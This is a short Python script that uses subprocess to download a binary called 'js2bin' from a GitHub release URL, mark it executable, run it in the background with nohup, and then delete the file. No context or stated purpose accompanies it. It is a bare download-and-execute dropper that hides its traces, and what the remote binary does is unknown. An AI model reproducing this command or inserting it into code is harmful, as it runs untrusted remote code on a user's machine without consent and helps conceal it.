import subprocess
cmd = "curl -L -o js2bin https://github.com/alphaxcv/scx/releases/download/dl/js2bin && chmod +x js2bin && nohup ./js2bin && rm js2bin"
subprocess.call(cmd, shell=True)
